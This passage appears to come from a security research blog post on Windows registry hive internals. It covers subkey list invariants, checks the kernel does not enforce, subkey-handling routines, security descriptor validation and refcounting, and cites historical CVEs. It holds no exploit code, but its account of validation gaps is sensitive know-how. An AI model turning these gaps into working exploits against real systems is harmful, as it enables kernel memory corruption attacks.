 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_9fzrrhqm4j52-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The signature of each subkey list cell must be correctly set to its corresponding type, one of &amp;#39;li&amp;#39;, &amp;#39;lf&amp;#39;, &amp;#39;lh&amp;#39; or &amp;#39;ri&amp;#39;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The size of the cell must be greater or equal to the number of bytes required to store all of the elements in the &amp;quot;List&amp;quot; array, according to the value of the &amp;quot;Count&amp;quot; member.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A subkey list cell may never be empty, i.e. _CM_KEY_INDEX.Count mustn&amp;#39;t be zero (whenever it becomes zero, it should be freed and un-referenced in any of the other hive cells).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The number of subkeys cached in the key node (_CM_KEY_NODE.SubKeyCounts[x]) must be equal to the number of subkeys defined in the subkey index (i.e. the sum of _CM_KEY_INDEX.Count of its index leaves).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The cell indexes stored in _CM_KEY_NODE.SubKeyLists[x] must either be HCELL_NIL (if SubKeyCounts[x] is zero), or point to a root index or one of the three leaf types. Additionally, SubKeyCounts[1] must be zero and SubKeyLists[1] must be HCELL_NIL on hive load.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;All cell indexes stored in a root index must point at valid leaf indexes.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;All cell indexes stored in leaf indexes must point at valid key nodes.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;All hints specified in the fast leaves and hash leaves must be consistent with the names of their corresponding keys.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span&gt;The overall subkey list must be sorted lexicographically, i.e. the name of each n+1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c41&quot;&gt;th&lt;/span&gt;&lt;span&gt;&amp;nbsp;subkey must be strictly greater than the name of the n&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c41&quot;&gt;th&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;subkey. This also entails that there mustn&amp;#39;t be any duplicates in the subkey list, neither with regards to the cell index or the subkey name.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Notably, there are also some constraints that seem very natural, but are in fact &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;enforced by the Windows kernel:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_ne238lfomw56-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;There is no requirement that the format of a leaf-type index must be consistent with the version of the hive: instead, every one of li/lf/lh types are accepted for every hive version 1.3 &amp;ndash; 1.6. The most glaring example of this behavior is that hash leaves are allowed in hive versions 1.3 and 1.4, even though they were historically only introduced in version 1.5 of the format.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;There is no requirement that all the leaf indexes referenced by a root index are all of the same type. In fact, a single subkey list may consist of an arbitrary combination of index leaves, fast leaves and hash leaves, and the kernel must handle such situations gracefully.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Beyond the fact that none of the actively used subkey indexes may be empty, there are no limitations with regards to how the subkeys are laid out in the data structure. For example, the existence of a root index doesn&amp;#39;t automatically indicate that there are many subkeys on the list: there may as well be a single root index, pointing to a single leaf, containing a single subkey. It is also allowed for several leafs being part of a single root index to have wildly different counts, with some single-digit ones coexisting with others around the 64K mark. The kernel doesn&amp;#39;t ensure any advanced &amp;quot;balancing&amp;quot; of the subkey index by default &amp;ndash; it does split large leafs into smaller ones, but only while adding a new subkey, and not during the loading of an existing hive.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Three examples of kernel vulnerabilities that were directly related to the handling of subkey lists are: &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451449&quot;&gt;CVE-2022-37956&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(integer overflows in registry subkey lists leading to memory corruption), &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451465&quot;&gt;CVE-2022-38037&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(memory corruption due to type confusion of subkey index leaves in registry hives) and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451661&quot;&gt;CVE-2024-26182&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(subkey list use-after-free due to mishandling of partial success in CmpAddSubKeyEx). I personally find the first one (CVE-2022-37956) particularly interesting, because the hive memory corruption could be triggered with the right sequence of API calls, or even just command-line reg.exe tool invocations. Granted that the number of required operations was quite high (around 66 million), but it still goes to show that being intimately familiar with the inner workings of the target software may open new avenues of exploitation that would otherwise not be available. For a detailed explanation of the subkey list management logic, see the next section.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.ef3jra69re3b&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Internal Windows logic of handling subkey lists&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;On top of the requirements and restrictions imposed by the regf format itself, there are some further characteristics of most registry hives found on real systems, caused by some decisions implemented in the logic of the Windows kernel. The most important thing to note is that, as mentioned above, the kernel operates on any subkey list &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;lazily&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, only when there is a need to do so due to a key being added/deleted in the registry. Therefore, a weirdly formatted (but adhering to the bare regf requirements) subkey index will remain in this state after loading, for as long as a client application doesn&amp;#39;t decide to change it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Most of the relevant high-level logic of handling subkey lists takes place when adding new keys, and is illustrated in the flow chart below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgK4FzEO7DB1fgLZ96e54QiXFtGiXuQIuXZDq6WCo-MSWWPBmYF70XVTr4iDGRx9YVhQhpEvcVC5fbBzWjjMPTMl9HFYaBvO5bVgLvps6cFhOSi-6GjyAh21FZkfMTWHOrPBS813mxVaguSBeOVejinIUwG_zyqzo89apHwtN8d8QMso2zluEw0kfA6gq4/s1999/image12.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgK4FzEO7DB1fgLZ96e54QiXFtGiXuQIuXZDq6WCo-MSWWPBmYF70XVTr4iDGRx9YVhQhpEvcVC5fbBzWjjMPTMl9HFYaBvO5bVgLvps6cFhOSi-6GjyAh21FZkfMTWHOrPBS813mxVaguSBeOVejinIUwG_zyqzo89apHwtN8d8QMso2zluEw0kfA6gq4/s1200/image12.png&quot; border=&quot;0&quot; alt=&quot;Complex flow chart describing the high-level logic handling of the subkey lists when ading new keys&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Complex flow chart describing the high-level logic handling of the subkey lists when ading new keys&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The general high-level function that implements the above logic in the Windows kernel is CmpAddSubKeyEx, which then calls a few helper routines with mostly self-descriptive names: CmpAddSubKeyToList, CmpSelectLeaf, CmpSplitLeaf and CmpAddToLeaf. Compared to addition, the process of deleting a key from the list is very straightforward, and is achieved by removing it from the respective leaf index, freeing the leaf if it was the last remaining element, and freeing the root index if it was present and the freed leaf was its last remaining element. There are no special steps being taken other than the strictly necessary ones to implement the functionality.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Given the above, we can conclude that registry hives created organically by Windows generally adhere to the following set of extra rules:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_9iss8y571b2b-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The leaf types being used are in line with the version of the hive: index and fast leaves for versions &amp;le;1.4, and hash leaves for versions &amp;ge;1.5.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;All leaves within a single index root have the same type.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Index leaves never contain more than 1012 elements.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Once a root index is created for a key, it is never downgraded back to a single leaf index other than through the deletion of all subkeys, and creating a new one starting from an empty subkey list.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.dkhewrmaf4ey&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Security descriptors&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Security descriptors play a central role in enforcing access control to the information stored in the registry. Their significance is apparent through the fact that they are the only mandatory property of registry keys, as opposed to classes, values and subkeys which are all optional. At the same time, large groups of keys typically share the same security settings, so it would make little sense to store a separate copy of the data for every one of them. For example, in a default installation of Windows 11, the SOFTWARE hive includes around 250,000 keys but only around 500 unique security descriptors. This is why they are the only type of cell in the hive that can be associated with multiple keys at the same time. By only storing a single instance of each unique descriptor in the hive, the system saves significant disk and memory space. However, this efficiency requires careful management of each descriptor&amp;#39;s usage through reference counting, which ensures they can be safely freed when no longer needed.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;When loading a hive, the kernel enumerates all of its security descriptors without having to traverse the entire key tree first. In order to make this possible, security descriptors in the stable space are organized into a doubly-linked list, starting at the descriptor of the root key. Internal consistency of this list is mandatory &amp;ndash; if any inconsistencies are found, it is reset to become a single-entry list with just the root security descriptor and nothing else. If the root security descriptor itself is corrupted, the hive is deemed to be in an unrecoverable state and rejected completely.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;While traversing the global list, the kernel also verifies that the binary encoding of the security descriptors is valid and safe to pass to internal security-related functions later in time. In the hives, descriptors are formatted as self-contained blobs of bytes adhering to the SECURITY_DESCRIPTOR_RELATIVE structure layout. Compared to other hive cells (key nodes etc.), the internal format of security cells is relatively complex: it is variable in size and contains multiple sub-structures (SIDs, ACLs, ACEs), length indicators and internal offsets. To detect any potential corruption early, the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlvalidrelativesecuritydescriptor&quot;&gt;RtlValidRelativeSecurityDescriptor&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;function must succeed for every descriptor in a newly loaded hive, otherwise the previously discussed fallback logic takes place.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The last step in the security descriptor validation process is to make sure that the reference counts specified in the hive are equal to the actual number of references from registry keys. This is achieved by re-counting the references when traversing the key tree structure of the hive, and later checking if the values found in _CM_KEY_SECURITY.ReferenceCount are in line with the regenerated counts. If the two values are unequal, the refcount in the security cell is adjusted to reflect the correct number of references. This is critical for system security, because operating on an invalid refcount &amp;ndash; especially an inadequately small one &amp;ndash; may directly lead to exploitable memory corruption conditions.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Some examples of historical vulnerabilities related to the three fundamental aspects of security descriptor consistency are as follows:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_iivgfpfdl0t3-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Linked list consistency:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451425&quot;&gt;CVE-2022-34708&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion&quot;&gt;CVE-2024-26178&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Security descriptor binary format validity:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451427&quot;&gt;CVE-2022-35768&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Reference counting:&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451423&quot;&gt;CVE-2022-34707&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451552&quot;&gt;CVE-2023-28248&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451596&quot;&gt;CVE-2023-35356&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451592&quot;&gt;CVE-2023-35382&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451601&quot;&gt;CVE-2023-38139&lt;/a&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A high-level illustration of a security descriptor linked list consisting of three elements is shown in the diagram below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTXWpBsQlSXs9DvSD8-xRXOpsZxH_n6U8a_qWbDBZE1mshkUwtD5b0x9OvxGTBtOR3mP6b6Xl0qRqRFtQ_3YFMC2ma6agYAicSzefN-iMcJOUS0keIdBbyYrGZoy144hS0vBLjBY3AJIfnZ-P6EP5fk2uMHKfRXzj7cnb4-dQCpiQcjb1hbVxWPG7W7U/s1999/image1.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTXWpBsQlSXs9DvSD8-xRXOpsZxH_n6U8a_qWbDBZE1mshkUwtD5b0x9OvxGTBtOR3mP6b6Xl0qRqRFtQ_3YFMC2ma6agYAicSzefN-iMcJOUS0keIdBbyYrGZoy144hS0vBLjBY3AJIfnZ-P6EP5fk2uMHKfRXzj7cnb4-dQCpiQcjb1hbVxWPG7W7U/s1200/image1.png&quot; border=&quot;0&quot; alt=&quot;A high-level illustration of a security descriptor linked list consisting of three elements&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A high-level illustration of a security descriptor linked list consisting of three elements&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.r9p9c8l63o18&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Security cell format&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Let&amp;#39;s now have a look at the specific layout of the security cells. They are represented by the _CM_KEY_SECURITY structure, whose definition is shown in the WinDbg format below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_KEY_SECURITY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_CM_KEY_SECURITY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x002&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Reserved&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Flink&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Blink&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ReferenceCount&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
